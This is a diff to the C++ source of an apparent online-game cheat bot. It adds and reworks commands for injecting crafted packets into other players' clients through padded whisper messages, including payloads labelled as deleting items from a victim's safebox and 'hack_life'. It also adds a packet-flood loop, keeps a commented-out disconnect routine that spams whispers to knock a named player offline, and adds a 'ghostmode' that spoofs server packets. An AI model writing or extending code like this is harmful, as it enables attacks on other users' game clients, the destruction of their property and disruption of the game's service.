@@ -204,29 +204,23 @@ void Command::_packet_injection(const string& username, Packet* p){
 		- Whisper
 		- Phase: "\xFD\x01"
 		- Delete from safebox: "\x56\x01"
+		- Chat (server command)
 	*/
-
 
 	string p_buf = p->get_buf();
 	cout << "Performing packet injection to " << username << endl;
 	cout << "[MALICIOUS PACKET] " << string_to_hex(p_buf) << endl;
 
 	string buf;
-
 	// padding
-	int i;
-	char c = '\xE1';
-	for (i = 0; i < INJECTION_PACKET_COUNT; i++)
-		buf += CG_Whisper(username, to_string(i) + string(INJECTION_PACKET_LEN, c++) + to_string(i)).get_buf();
+	for (int i = 0; i < INJ_PACKET_COUNT; i++)
+		buf += CG_Whisper(username, string(INJ_PACKET_LEN, INJ_PADDING_BYTE)).get_buf();
 
 	// packet
-	//buf += CG_Whisper(username, to_string(i) + string(78, c) + p_buf).get_buf();
-	buf += CG_Whisper(username, to_string(i) + string(69, c) + p_buf).get_buf();
+	buf += CG_Whisper(username, string(INJ_LAST_PACKET_PAD, INJ_PADDING_BYTE) + p_buf).get_buf();
 
-	// Valid packet after malicious packet
-	c++;
-	i++;
-	buf += CG_Whisper(username, to_string(i) + string(200, c++) + to_string(i)).get_buf();
+	// Valid packet after malicious packet. Seems like it is not necessary anymore.
+	//buf += CG_Whisper(username, string(202, ' ')).get_buf();
 
 	Packet pkt(buf);
 	pkt.send();
@@ -245,6 +239,42 @@ void Command::_disconnect() {
 	}
 	instance->disconnecting = false;
 }
+/*
+void Command::_disconnect() {
+	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
+	cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
+	string buf;
+	int i = 0;
+	for (int i = 0; i < instance->disconnect_packets; i++){
+		CG_Whisper p(instance->username_dc, string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE));
+		buf += p.get_buf();
+	}
+	Packet p(buf);
+	p.send();
+	instance->disconnecting = false;
+}*/
+
+void Command::_test_chat() {
+	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
+	cout << "[BOT] Sending " << instance->test_chat_packets << " chat packets" << endl;
+	int i = 0;
+	while (instance->test_chatting && i < instance->test_chat_packets) {
+		//cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
+		//CG_Chat p(0, to_string(i) + string(TEST_CHAT_PACKET_LEN, 'a') + to_string(i));
+		//CG_ItemUse p(1);
+
+		// 43 00 46DC0200 D7
+		string buf = "\x43";
+		buf += '\x00';
+		buf += string((char*)&instance->target, 4);
+		buf += '\x00';
+		Packet p(buf);
+		p.send();
+		//Sleep(1);
+		i++;
+	}
+	instance->test_chatting = false;
+}
 
 void Command::disconnect(const string& username, int n_packets){
 	instance->username_dc = username;
@@ -252,6 +282,14 @@ void Command::disconnect(const string& username, int n_packets){
 	if (!instance->disconnecting){
 		instance->disconnecting = true;
 		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_disconnect, 0, 0, 0);
+	}
+}
+
+void Command::test_chat(int n_packets) {
+	instance->test_chat_packets = n_packets;
+	if (!instance->test_chatting) {
+		instance->test_chatting = true;
+		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_test_chat, 0, 0, 0);
 	}
 }
 
@@ -296,6 +334,54 @@ void Command::hack_life(const string& username, const string& cmd){
 
 	_packet_injection(username, &p);
 	print("Hacked life");
+}
+
+void Command::ghostmode(){
+	// TESTING
+	string buf;
+	Packet p;
+	
+	// Fase
+	/*buf = "\xFD\x05";
+	p = Packet(buf);
+	p.recv();*/
+
+	// Char del
+	GC_CharacterDel p2(objects::Player->id);
+	p2.recv();
+	/*
+	// OJO AL WARNING QUE DA
+	// transformar coords abs a rel?
+	// Char add
+	//GC_CharacterAdd p3(objects::Player->id, 0, objects::Player->x, objects::Player->y, objects::Player->z,
+	GC_CharacterAdd p3(objects::Player->id, 0, 0, 0, 0,
+		6, 0x200, 0x64, 0x64);
+	p3.recv();
+
+	// Chat additional info
+	buf = "\x88";
+	buf += string((char*)&objects::Player->id, 4);
+	buf += hex_to_string("4B6C65636B6F35000000000000000000000000000000000000000000000000000003000000000100000001000300000000");
+
+
+	// Points (hp)
+	buf = hex_to_string("11000000");
+	buf += string((char*)&objects::Player->id, 4);
+	buf += hex_to_string("050000000032000000");
+	p = Packet(buf);
+	p.recv();
+
+	// Char update
+	buf = "\x13";
+	buf += string((char*)&objects::Player->id, 4);
+	buf += hex_to_string("000000000000000064640000000008000000000000000001000300000000");
+	p = Packet(buf);
+	p.recv();
+	
+	// No idea
+	buf = hex_to_string("7ED700000000000000001C0000000500000000000000");
+	p = Packet(buf);
+	p.recv();*/
 }
 
 void Command::run(const string& _cmd){
@@ -355,6 +441,15 @@ void Command::run(const string& _cmd){
 	} else if (cmd[0] == "dc_stop"){
 		instance->disconnecting = false;
 
+	} else if (cmd[0] == "test_chat") {
+		if (check_n_args(1, cmd))
+			test_chat(stoi(cmd[1]));
+		else
+			test_chat();
+
+	} else if (cmd[0] == "test_chat_stop") {
+		instance->test_chatting = false;
+
 	} else if (cmd[0] == "whisp"){
 		if (check = check_n_args(4, cmd)){
 			string msg;
@@ -385,6 +480,9 @@ void Command::run(const string& _cmd){
 				msg += *it + " ";
 			hack_life(cmd[1], msg);
 		}
+
+	} else if (cmd[0] == "ghostmode"){
+		ghostmode();
 
 	} else print_err("Unknown command: " + cmd[0]);
 
